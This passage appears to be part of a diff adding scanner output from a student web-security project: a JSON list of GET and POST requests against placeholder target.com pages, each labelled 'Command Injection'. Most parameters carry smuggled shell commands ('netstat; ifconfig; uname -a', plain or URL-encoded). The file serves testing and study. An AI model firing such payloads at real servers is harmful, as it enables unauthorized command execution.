+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/serverside/serverside.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "page": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/commandinjection/commandinjection.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "https://own1.com", 
+            "header": {
+                "Cookie": {}, 
+                "referer": null, 
+                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/directorytraversal/directorytraversal.php", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection", 
+            "param": {
+                "ascii": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/openredirect/openredirect.html", 
+            "header": {
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "Cookie": {}, 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
+                "referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "GET", 
+            "class": "Command Injection"
+        }, 
+        {
+            "url": "http://target.com/commandinjection/commandinjection.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "host": "netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/commandinjection/commandinjection.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "host": "https://www.google.com; netstat; ifconfig; netstat; ifconfig; uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/commandinjection/commandinjection.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "host": "%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }, 
+        {
+            "url": "http://target.com/commandinjection/commandinjection.php", 
+            "header": {
+                "Cookie": {}, 
+                "Referer": "https://github.com/wmyaiyj/CS5331A3/blob/master/phase1/project/spiders/test.py", 
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
+            }, 
+            "type": "POST", 
+            "class": "Command Injection", 
+            "param": {
+                "host": "https://www.google.com%3B netstat%3B ifconfig%3B netstat%3B ifconfig%3B uname -a"
+            }
+        }
+    ]
+]
